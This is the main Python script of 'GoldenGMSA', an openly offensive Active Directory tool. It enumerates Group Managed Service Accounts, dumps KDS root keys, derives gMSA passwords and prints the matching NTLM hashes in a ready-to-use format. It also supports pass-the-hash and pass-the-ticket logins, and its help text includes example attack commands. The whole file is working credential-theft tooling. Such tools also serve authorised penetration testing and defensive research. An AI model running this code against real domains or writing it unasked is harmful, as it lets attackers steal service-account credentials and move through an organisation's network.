#!/usr/bin/env python3
"""
GoldenGMSA - Python Implementation
Tool for exploiting Group Managed Service Accounts (gMSA) in Active Directory.
Based on research by Yuval Gordon (@YuG0rd).

Usage:
    python main.py gmsainfo [options]
    python main.py kdsinfo [options]
    python main.py compute [options]

For more details, see README.md
"""

import argparse
import sys
import traceback
from typing import Optional, List
import logging

from golden_gmsa.gmsa_account import GmsaAccount
from golden_gmsa.root_key import RootKey
from golden_gmsa.gmsa_password import GmsaPassword
from golden_gmsa.msds_managed_password_id import MsdsManagedPasswordId
from golden_gmsa.ldap_utils import LdapUtils, LdapConnection


def setup_logging():
    """Configure application logging."""
    logging.basicConfig(
        level=logging.WARNING,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )


def process_gmsa_info(args):
    """Process the gmsainfo command."""
    print()
    try:
        domain_name = args.domain.lower() if args.domain else LdapUtils.get_current_domain()
        if domain_name:
            domain_name = domain_name.lower()
        
        if args.sid:
            gmsa = GmsaAccount.get_gmsa_account_by_sid(domain_name, args.sid)
            if gmsa:
                print(gmsa.to_string())
            else:
                print(f"gMSA with SID {args.sid} not found in domain {domain_name}")
        else:
            gmsa_accounts = GmsaAccount.find_all_gmsa_accounts_in_domain(domain_name)
            for gmsa in gmsa_accounts:
                print(gmsa.to_string())
                
    except Exception as ex:
        print(f"ERROR: {ex}")
        if args.verbose:
            traceback.print_exc()


def process_kds_info(args):
    """Process the kdsinfo command."""
    print()
    try:
        forest_name = args.forest.lower() if args.forest else LdapUtils.get_current_forest()
        if forest_name:
            forest_name = forest_name.lower()

        if args.guid:
            root_key = RootKey.get_root_key_by_guid(forest_name, args.guid)
            if root_key is None:
                print(f"KDS root key with ID {args.guid} not found")
            else:
                print(root_key.to_string())
        else:
            root_keys = RootKey.get_all_root_keys(forest_name)
            for root_key in root_keys:
                print(root_key.to_string())

    except Exception as ex:
        print(f"ERROR: {ex}")
        if args.verbose:
            traceback.print_exc()


def process_compute(args):
    """Process the compute command."""
    print()
    try:
        if not args.sid:
            raise ValueError("--sid argument is required")
            
        domain_name = ""
        forest_name = ""
        
        # Online mode (requires privileged access)
        if not args.kdskey or not args.pwdid:
            if not args.forest:
                forest_name = LdapUtils.get_current_forest()
            else:
                forest_name = args.forest
            if forest_name:
                forest_name = forest_name.lower()
                
            if not args.domain:
                domain_name = LdapUtils.get_current_domain()
            else:
                domain_name = args.domain
            if domain_name:
                domain_name = domain_name.lower()
        
        pwd_id = None
        root_key = None
        
        if not args.pwdid:
            pwd_id = MsdsManagedPasswordId.get_managed_password_id_by_sid(domain_name, args.sid)
        else:
            import base64
            pwd_id_bytes = base64.b64decode(args.pwdid)
            pwd_id = MsdsManagedPasswordId(pwd_id_bytes)
        
        if pwd_id is None:
            print(f"Failed to locate managed password ID for SID {args.sid}")
            return
        
        if not args.kdskey:
            root_key = RootKey.get_root_key_by_guid(forest_name, pwd_id.root_key_identifier)
        else:
            import base64
            try:
                # Clean Base64 string (remove whitespace and newlines)
                kdskey_clean = args.kdskey.strip().replace('\n', '').replace('\r', '').replace(' ', '')
                if not kdskey_clean:
                    print(f"ERROR: Provided KDS key is empty")
                    return
                root_key_bytes = base64.b64decode(kdskey_clean)
                if not root_key_bytes:
                    print(f"ERROR: Decoded KDS key is empty")
                    return
                root_key = RootKey(root_key_bytes=root_key_bytes)
            except base64.binascii.Error as e:
                print(f"ERROR: Invalid Base64 format for KDS key: {e}")
                if args.verbose:
                    traceback.print_exc()
                return
            except ValueError as e:
                print(f"ERROR: {e}")
                if args.verbose:
                    traceback.print_exc()
                return
            except Exception as e:
                print(f"ERROR: Failed to decode or initialize KDS key: {e}")
                if args.verbose:
                    traceback.print_exc()
                return
        
        if root_key is None:
            print(f"Failed to locate KDS root key with ID {pwd_id.root_key_identifier}")
            return
        
        # Retrieve gMSA account info for display
        gmsa_account = None
        try:
            if domain_name:
                gmsa_account = GmsaAccount.get_gmsa_account_by_sid(domain_name, args.sid)
        except:
            pass  # Ignore if we can't retrieve info (e.g. offline mode)
        
        pwd_bytes = GmsaPassword.get_password(
            args.sid, root_key, pwd_id, domain_name, forest_name
        )
        
        # Display account info if available
        if gmsa_account:
            print(f"gMSA Account:\t\t{gmsa_account.sam_account_name}")
            print(f"SID:\t\t\t{args.sid}")
        
        # The password blob is 256 bytes from the KDF output.
        # NTLM hash = MD4 of the FULL 256-byte blob.
        # Note: gMSADumper uses [:-2] because the msDS-ManagedPassword blob has a null terminator,
        # but raw KDF output does not — so we hash the complete blob.
        if len(pwd_bytes) >= 2:
            from Crypto.Hash import MD4
            ntlm_hash_obj = MD4.new()
            ntlm_hash_obj.update(pwd_bytes)
            nt_hash = ntlm_hash_obj.hexdigest()

            print(f"NTLM Hash (NT only):\t{nt_hash}")

            # Format for nxc/impacket with empty LM hash (standard format)
            lm_hash_empty = "aad3b435b51404eeaad3b435b51404ee"
            print(f"NTLM Hash (nxc format):\t{lm_hash_empty}:{nt_hash}")
            
        
        import base64
        print(f"Password Blob (Base64):\t{base64.b64encode(pwd_bytes).decode('utf-8')}")
        
    except Exception as ex:
        print(f"ERROR: {ex}")
        if args.verbose:
            traceback.print_exc()


def main():
    """Main application entry point."""
    setup_logging()
    
    parser = argparse.ArgumentParser(
        description="GoldenGMSA - Exploit Group Managed Service Accounts (gMSA) in Active Directory",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:

# Enumerate all gMSA accounts
python main.py gmsainfo

# Query a specific gMSA by SID
python main.py gmsainfo --sid S-1-5-21-2183999363-403723741-3725858571

# Dump all KDS Root Keys
python main.py kdsinfo

# Dump a specific KDS Root Key
python main.py kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

# Compute gMSA password (online mode)
python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571

# Compute gMSA password (offline mode)
python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
    --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAA... \\
    --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
        """
    )
    
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Enable verbose debug output')
    
    # Global authentication arguments
    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('-u', '--username', type=str,
                           help='Username (format: user@domain.com or DOMAIN\\user)')
    auth_group.add_argument('-p', '--password', type=str,
                           help='Password')
    auth_group.add_argument('-d', '--domain', type=str,
                           help='Domain/DC to query')
    auth_group.add_argument('-f', '--forest', type=str,
                           help='Forest to query')
    auth_group.add_argument('--dc-ip', type=str,
                           help='Domain controller IP address')
    auth_group.add_argument('--use-ssl', action='store_true',
                           help='Use LDAPS (port 636)')
    
    # Advanced authentication (PTH/PTT)
    advanced_auth_group = parser.add_argument_group('Advanced Authentication (PTH/PTT)')
    advanced_auth_group.add_argument('--nt-hash', '--nthash', type=str,
                                    help='NTLM hash for Pass-the-Hash (format: 32 hex chars)')
    advanced_auth_group.add_argument('--lm-hash', '--lmhash', type=str,
                                    help='LM hash for Pass-the-Hash (optional, default: empty)')
    advanced_auth_group.add_argument('--aes-key', '--aeskey', type=str,
                                    help='AES key for Kerberos authentication')
    advanced_auth_group.add_argument('--ccache', type=str,
                                    help='Kerberos ccache file for Pass-the-Ticket')
    advanced_auth_group.add_argument('--use-kerberos', '--kerberos', action='store_true',
                                    help='Force Kerberos authentication')
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # gmsainfo command
    gmsa_parser = subparsers.add_parser('gmsainfo',
                                       help='Query gMSA account information')
    gmsa_parser.add_argument('-s', '--sid', type=str,
                            help='SID of the gMSA to query')
    
    # kdsinfo command
    kds_parser = subparsers.add_parser('kdsinfo',
                                      help='Query KDS Root Key information')
    kds_parser.add_argument('-g', '--guid', type=str,
                           help='GUID of the KDS Root Key object')
    
    # compute command
    compute_parser = subparsers.add_parser('compute',
                                          help='Compute gMSA passwords')
    compute_parser.add_argument('-s', '--sid', type=str, required=True,
                               help='SID of the gMSA account')
    compute_parser.add_argument('-k', '--kdskey', type=str,
                               help='Base64-encoded KDS Root Key blob')
    compute_parser.add_argument('--pwdid', type=str,
                               help='Base64-encoded msds-ManagedPasswordID attribute value')
    
    # Parse arguments with case-insensitive command normalization
    raw_args = sys.argv[1:]

    # Normalize command (first argument) to lowercase if it's a valid command
    valid_commands = ['gmsainfo', 'kdsinfo', 'compute']
    if raw_args and raw_args[0].lower() in [cmd.lower() for cmd in valid_commands]:
        raw_args[0] = raw_args[0].lower()
    
    args = parser.parse_args(raw_args if raw_args else sys.argv[1:])
    
    # Normalize command to lowercase (case-insensitive)
    if args.command:
        args.command = args.command.lower()
    
    if not args.command:
        parser.print_help()
        return
    
    try:
        ldap_conn = None
        
        # Normalize domain and forest to lowercase
        if args.domain:
            args.domain = args.domain.lower()
        if args.forest:
            args.forest = args.forest.lower()
        
        # Check if any authentication method is provided
        has_auth = (
            args.password or 
            getattr(args, 'nt_hash', None) or 
            getattr(args, 'ccache', None) or 
            getattr(args, 'aes_key', None) or
            getattr(args, 'use_kerberos', False)
        )
        
        if args.username and has_auth:
            domain = args.domain or args.forest
            if not domain:
                print("ERROR: --domain or --forest required with --username")
                sys.exit(1)
                
            # Determine authentication method
            auth_method = "password"
            if hasattr(args, 'nt_hash') and args.nt_hash:
                auth_method = "Pass-the-Hash"
            elif hasattr(args, 'ccache') and args.ccache:
                auth_method = "Pass-the-Ticket"
            elif hasattr(args, 'aes_key') and args.aes_key:
                auth_method = "Kerberos (AES)"
            elif hasattr(args, 'use_kerberos') and args.use_kerberos:
                auth_method = "Kerberos"
            
            print(f"Authenticating to domain {domain} ({auth_method})...")
            ldap_conn = LdapConnection(
                domain=domain,
                username=args.username,
                password=args.password,
                use_ssl=args.use_ssl,
                dc_ip=args.dc_ip,
                nt_hash=getattr(args, 'nt_hash', None),
                lm_hash=getattr(args, 'lm_hash', None),
                aes_key=getattr(args, 'aes_key', None),
                ccache=getattr(args, 'ccache', None),
                use_kerberos=getattr(args, 'use_kerberos', False)
            )
            ldap_conn.connect()
            LdapUtils.set_connection(ldap_conn)
            print(f"Connected to domain {domain}\n")
        
        if args.command == 'gmsainfo':
            process_gmsa_info(args)
        elif args.command == 'kdsinfo':
            process_kds_info(args)
        elif args.command == 'compute':
            process_compute(args)
        else:
            print(f"Unknown command: {args.command}")
            parser.print_help()
            
        if ldap_conn:
            ldap_conn.disconnect()
            
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        sys.exit(1)
    except Exception as ex:
        print(f"Fatal error: {ex}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
